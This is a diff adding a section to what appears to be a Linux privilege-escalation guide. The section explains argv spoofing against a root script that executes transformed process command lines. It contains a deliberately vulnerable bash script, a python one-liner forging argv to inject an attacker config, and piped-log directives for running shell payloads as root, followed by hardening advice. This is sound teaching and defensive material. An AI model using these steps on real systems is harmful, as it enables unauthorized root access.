@@ -220,6 +220,57 @@ Also **check your privileges over the processes binaries**, maybe you can overwr
 
 You can use tools like [**pspy**](https://github.com/DominicBreuker/pspy) to monitor processes. This can be very useful to identify vulnerable processes being executed frequently or when a set of requirements are met.
 
+### Process argv spoofing via unsafe command-line execution
+
+If a privileged script/service builds a command by reading another process’ full command line (e.g., with `pgrep -lfa` or `ps -eo pid,cmd`), performs string substitutions, and then executes that string, you can often escalate by spawning a user process with a forged argv that matches their pattern and injects additional flags.
+
+Vulnerable pattern example (root cron/systemd unit):
+
+```bash
+#!/usr/bin/bash
+RET=0
+while read pid _cmd ; do
+  # Replace apache2 with apache2ctl and add -t for test
+  cmd="${_cmd/apache2/apache2ctl} -t"
+  $cmd >/dev/null 2>&1
+  RET=$?
+done <<< $(/usr/bin/pgrep -lfa "^/opt/zroweb/sbin/apache2.-k.start.-d./opt/zroweb/conf")
+exit $RET
+```
+
+What’s wrong:
+- It trusts untrusted process cmdlines and then executes them as root after a transform.
+- Word-splitting/globbing lets an attacker inject extra arguments that will be executed.
+
+Forge argv and inject flags
+- Use execve-style APIs to fully control argv, including argv[0]. Example:
+
+```bash
+python3 -c 'import os; os.execv("/bin/sleep", ["/opt/zroweb/sbin/apache2 -k start -d /opt/zroweb/conf -f /tmp/evil.conf", "60"])'
+```
+
+- Verify your fake cmdline is visible to matchers:
+
+```bash
+ps auxww | grep "/opt/zroweb/sbin/apache2 -k start"
+pgrep -f "/opt/zroweb/sbin/apache2 -k start"
+```
+
+- When the root script runs, its transform turns your forged string into something like:
+
+```bash
+apache2ctl -t -k start -d /opt/zroweb/conf -f /tmp/evil.conf
+```
+
+- By pointing `-f` to an attacker-controlled config, you can get root to parse your configuration. Directives with side effects (e.g., piped logs using `ErrorLog "|/bin/sh -c '<payload>'"`, `CustomLog "|..."`) can execute commands under the caller’s privileges. Even if `-t` is appended to force a config test, some environments still trigger side effects during parsing/initialization; in others, similar patterns without `-t` or with `reload` are observed.
+
+Hunting and hardening
+- Grep for these patterns in root-owned scripts/units:
+  - `pgrep -lfa`, `ps -eo pid,cmd`, `ps auxww` piped into `read` and then `$cmd` / `eval` / backticks.
+  - Any use of process command lines combined with string substitution and execution.
+- Never execute strings taken from process command lines. Instead, operate on PIDs: validate executable paths (`/proc/$pid/exe`), whitelist expected binaries, and exec them with fixed arguments.
+- Quote arguments and avoid `eval`/implicit word-splitting.
+
 ### Process memory
 
 Some services of a server save **credentials in clear text inside the memory**.\
@@ -1673,6 +1724,7 @@ cisco-vmanage.md
 - [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
 - [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
 - [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
+- [HTB Zero: LFI via .htaccess ErrorDocument and root via apache2ctl -t argv spoofing](https://0xdf.gitlab.io/2025/08/12/htb-zero.html)
 
 
 ## Android rooting frameworks: manager-channel abuse
